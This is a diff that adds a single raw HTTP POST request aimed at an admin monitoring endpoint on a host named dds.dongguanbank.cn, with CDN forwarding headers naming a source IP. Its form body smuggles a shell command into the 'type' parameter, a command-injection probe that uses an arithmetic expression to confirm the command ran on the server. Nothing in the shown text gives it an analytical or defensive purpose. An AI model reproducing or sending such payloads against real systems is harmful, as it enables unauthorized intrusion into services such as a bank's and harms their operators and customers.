@@ -1,0 +1,16 @@
+POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1
+Host: dds.dongguanbank.cn
+Content-Length: 39
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Content-Type: application/x-www-form-urlencoded
+Cdn-Src-Ip: 43.139.126.32
+X-Cdn-Src-Port: 55771
+X-Http-Protocol: http
+X-Ws-Request-Id: 63f30c6a_PS-000-013Ja13_31507-11890
+Cdn-Server-Port: 80
+Accept-Encoding: gzip
+X-Via: 1.1 PS-000-013Ja13:1 (Cdn Cache Server V2.0), 1.1 PS-JJN-01L7u177:9 (Cdn Cache Server V2.0)
+Connection: keep-alive
+X-Forwarded-For: 43.139.126.32
+
+type=1%27|expr+32633214+-+13893662||%27
